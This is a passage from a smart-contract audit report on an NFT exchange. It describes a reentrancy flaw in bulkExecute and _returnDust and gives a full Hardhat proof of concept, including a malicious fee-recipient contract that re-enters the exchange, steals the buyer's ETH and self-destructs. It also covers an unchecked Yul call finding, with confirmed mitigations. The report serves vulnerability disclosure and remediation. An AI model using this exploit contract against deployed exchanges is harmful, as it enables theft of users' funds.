href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L40\">https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L40</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"4\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    modifier setupExecution() {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        remainingETH = msg.value;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        isInternal = true;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        remainingETH = 0;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        isInternal = false;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p><code>_execute</code> will be called to handle the buy and sell order.</p>\n<ul>\n<li>The function has a reentracnyGuard. </li>\n<li>The function will check that the orders are signed correctly and that both orders match.</li>\n<li>If everything is OK, <code>_executeFundsTransfer</code> will be called to transfer the buyers funds to the seller and fee recipient</li>\n</ul>\n<p><code>_executeFundsTransfer</code>:\n<a href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L565\">https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L565</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"5\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function _executeFundsTransfer(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address seller,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address buyer,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address paymentToken,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        Fee[] calldata fees,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 price</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) internal {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (msg.sender == buyer &amp;&amp; paymentToken == address(0)) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            require(remainingETH &gt;= price);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            remainingETH -= price;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        /* Take fee. */</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 receiveAmount = _transferFees(fees, paymentToken, buyer, price);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        /* Transfer remainder to seller. */</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _transferTo(paymentToken, buyer, seller, receiveAmount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>Fees are calculated based on the rate set by the seller and send to the fee recipient in <code>_transferFees</code>. </p>\n<p>When the fee recipient receives the funds. They can reenter the Exchange contract and drain the balance of contract.\nThis can be done through <code>bulkExecution</code>.</p>\n<p><code>bulkExecution</code> can be called with an empty array. If so, no <code>_execute</code> function will be called and therefore no reentrancyGuard will trigger.\nAt the end of <code>bulkExecution</code>, <code>_returnDust</code> function is called to return excessive funds.</p>\n<p><code>bulkExecute</code>:\n<a href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L168\">https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L168</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"6\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function bulkExecute(Execution[] calldata executions)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        external</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        payable</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        whenOpen</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        setupExecution</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        /*</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        REFERENCE</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 executionsLength = executions.length;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        for (uint8 i=0; i &lt; executionsLength; i++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            bytes memory data = abi.encodeWithSelector(this._execute.selector, executions[i].sell, executions[i].buy);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            (bool success,) = address(this).delegatecall(data);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _returnDust(remainingETH);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        */</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 executionsLength = executions.length;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        for (uint8 i = 0; i &lt; executionsLength; i++) {</span></span></code></pre>\n<p><code>_returnDust</code>:\n<a href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L212\">https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L212</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"7\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function _returnDust() private {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 _remainingETH = remainingETH;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        assembly {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            if gt(_remainingETH, 0) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                let callStatus := call(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                    gas(),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                    caller(),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                    selfbalance(),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                    0,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                    0,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                    0,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                    0</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                )</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>After the fee recipient drains the rest of the 4 ETH funds of the Exchange contract (the buyers funds). They need to transfer a portion back (0.9 ETH) to the Exchange contract in order for the <code>_executeFundsTransfer</code> to not revert and be able to send funds (0.9 ETH) to the seller. This can be done using the <code>selfdestruct</code> opcode</p>\n<p>After that, the <code>_execute</code> function will continue and exit normally.<br>\n<code>bulkExecute</code> will continue to the next order and call <code>_execute</code> which will revert.<br>\nBecause <code>bulkExecute</code> delegatecalls <code>_execute</code> and continues even after revert, the function <code>bulkExecute</code> will complete its execution without any errors and all the buyers ETH funds will be lost and nothing will be refunded.</p>\n<h3 id=\"hardhat-proof-of-concept\" style=\"position:relative;\"><a href=\"#hardhat-proof-of-concept\" aria-label=\"hardhat proof of concept permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Hardhat Proof of Concept</h3>\n<p>Add the following test to <code>execution.test.ts</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"8\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">describe.only(&#39;hack&#39;, async () =&gt; {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let executions: any[];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let value: BigNumber;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      beforeEach(async () =&gt; {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        await updateBalances();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        const _executions = [];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        value = BigNumber.from(0);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // deploy MockFeeReceipient</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        let contractFactory = await (hre as any).ethers.getContractFactory(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          &quot;MockFeeReceipient&quot;,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          {},</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        let contractMockFeeReceipient = await contractFactory.deploy(alice.address,price);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        await contractMockFeeReceipient.deployed();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        //generate alice and bob orders. alice fee recipient is MockFeeReceipient. 10% cut</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        tokenId += 1;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        await mockERC721.mint(alice.address, tokenId);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        sell = generateOrder(alice, {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          side: Side.Sell,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          tokenId,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          paymentToken: ZERO_ADDRESS,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          fees: [ </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">              rate: 1000,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">              recipient: contractMockFeeReceipient.address,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          ],</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        });</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        buy = generateOrder(bob, { </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          side: Side.Buy,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          tokenId,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          paymentToken: ZERO_ADDRESS});</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _executions.push({</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            sell: await sell.packNoOracleSig(),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            buy: await buy.packNoSigs(),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        });</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // create 3 more executions</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        tokenId += 1;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        for (let i = tokenId; i &lt; tokenId + 3; i++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          await mockERC721.mint(thirdParty.address, i);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          const _sell = generateOrder(thirdParty, {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            side: Side.Sell,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            tokenId: i,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            paymentToken: ZERO_ADDRESS,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          });</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          const _buy = generateOrder(bob, {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            side: Side.Buy,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            tokenId: i,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            paymentToken: ZERO_ADDRESS,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          });</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          _executions.push({</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            sell: await _sell.packNoOracleSig(),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            buy: await _buy.packNoSigs(),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          });</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        executions = _executions;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      });</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      it(&quot;steal funds&quot;, async () =&gt; {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        let aliceBalanceBefore = await alice.getBalance();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        //price = 4 ETH</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        value = price.mul(4);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        //call bulkExecute</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        tx = await waitForTx(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          exchange.connect(bob).bulkExecute(executions, { value  }));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        let aliceBalanceAfter = await alice.getBalance();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        let aliceEarned = aliceBalanceAfter.sub(aliceBalanceBefore);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        //check that alice received all 4 ETH</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        expect(aliceEarned).to.equal(value);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      });</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    });</span></span></code></pre>\n<p>Add the following contract to mocks folder:<br>\n<code>MockFeeRecipient.sol</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"9\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">pragma solidity 0.8.17;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import { Exchange } from &quot;../Exchange.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import { Execution } from &quot;../lib/OrderStructs.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">contract MockFeeReceipient {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    bool lock;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address _seller;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 _price;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    constructor(address seller, uint256 price) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _seller = seller;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _price = price;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    receive() external payable {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        Exchange ex = Exchange(msg.sender);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if(!lock){</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            lock = true;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // first entrance when receiving fee</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            uint256 feeAmount = msg.value;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // Create empty calldata for bulkExecute and call it</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            Execution[] memory executions = new Execution[](0);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            bytes memory data = abi.encodeWithSelector(Exchange.bulkExecute.selector, executions);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            address(ex).call{value: 1}(data);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // Now we received All of buyers funds. </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // Send stolen ETH to seller minus the amount needed in order to keep execution.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            address(_seller).call{value: address(this).balance - (_price - feeAmount)}(&#39;&#39;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // selfdestruct and send funds needed to Exchange (to not revert)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            selfdestruct(payable(msg.sender));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        else{</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // Second entrance after steeling balance</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // We will get here after getting funds from reentrancy</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>Execute <code>yarn test</code> to see that test pass (Alice stole all 4 ETH)</p>\n<h3 id=\"tools-used\" style=\"position:relative;\"><a href=\"#tools-used\" aria-label=\"tools used permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VS code, hardhat</p>\n<h3 id=\"recommended-mitigation-steps\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps\" aria-label=\"recommended mitigation steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<ol>\n<li>Put a reentrancyGuard on <code>execute</code> and <code>bulkExecute</code> functions</li>\n<li><code>_refundDust</code> return only _remainingETH</li>\n<li>revert in <code>bulkExecute</code> if parameter array is empty.</li>\n</ol>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/96#issuecomment-1341617796\">nonfungible47 (Blur) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Both mitigation steps 2 and 3 were added. We cannot add <code>reentrancyGuard</code> to the <code>execute</code> and <code>bulkExecute</code> functions as it will break the call to <code>_execute</code>. So, a separate guard was added in <code>setupExecution</code> that would require <code>isInternal = false</code>, preventing reentrant calls.</p>\n</blockquote>\n<hr>\n<h1 id=\"medium-risk-findings-2\" style=\"position:relative;\"><a href=\"#medium-risk-findings-2\" aria-label=\"medium risk findings 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Medium Risk Findings (2)</h1>\n<h2 id=\"m-01-yul-call-return-value-not-checked\" style=\"position:relative;\"><a href=\"#m-01-yul-call-return-value-not-checked\" aria-label=\"m 01 yul call return value not checked permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/90\">[M-01] Yul <code>call</code> return value not checked</a></h2>\n<p><em>Submitted by rotcivegaf, also found by 0x4non, 0xDecorativePineapple, 9svR6w, adriro, ajtra, aviggiano, brgltd, carlitox477, chaduke, codexploder, corerouter, joestakey, ladboy233, s3cunda, saian, Trust, V_B, and wait</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L212-L227\">Exchange.sol#L212-L227</a><br></p>\n<p>The Yul <code>call</code> return value on function <code>_returnDust</code> is not checked, which could leads to the <code>sender</code> lose funds</p>\n<h3 id=\"proof-of-concept-1\" style=\"position:relative;\"><a href=\"#proof-of-concept-1\" aria-label=\"proof of concept 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The caller of the functions <code>bulkExecute</code> and <code>execute</code> could be a contract who may not implement the <code>fallback</code> or <code>receive</code> functions or reject the <code>call</code>, when a call to it with value sent in the function <code>_returnDust</code>, it will revert, thus it would fail to receive the <code>dust</code> ether</p>\n<p>Proof: </p>\n<ul>\n<li>A contract use <code>bulkExecute</code></li>\n<li>One of the executions fails</li>\n<li>The <code>Exchange</code> contract send the <code>dust</code>(Exchange balance) back to the contract </li>\n<li>This one for any reason reject the call</li>\n<li>The <code>dust</code> stay in the <code>Exchange</code> contract</li>\n<li>In the next call of <code>bulkExecute</code> or <code>execute</code> the balance of the <code>Exchange</code> contract(including the old <code>dust</code>) will send to the new caller</li>\n<li>The second sender will get the funds of the first contract</li>\n</ul>\n<h3 id=\"recommended-mitigation-steps-1\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-1\" aria-label=\"recommended mitigation steps 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"10\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    error ReturnDustFail();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t function _returnDust() private {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t\t uint256 _remainingETH = remainingETH;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        bool success;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t\t assembly {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t\t\t\t if gt(_remainingETH, 0) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                let callStatus := call(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                success := call(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t\t\t\t\t\t\t\t gas(),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t\t\t\t\t\t\t\t caller(),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t\t\t\t\t\t\t\t selfbalance(),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t\t\t\t\t\t\t\t 0,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t\t\t\t\t\t\t\t 0,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t\t\t\t\t\t\t\t 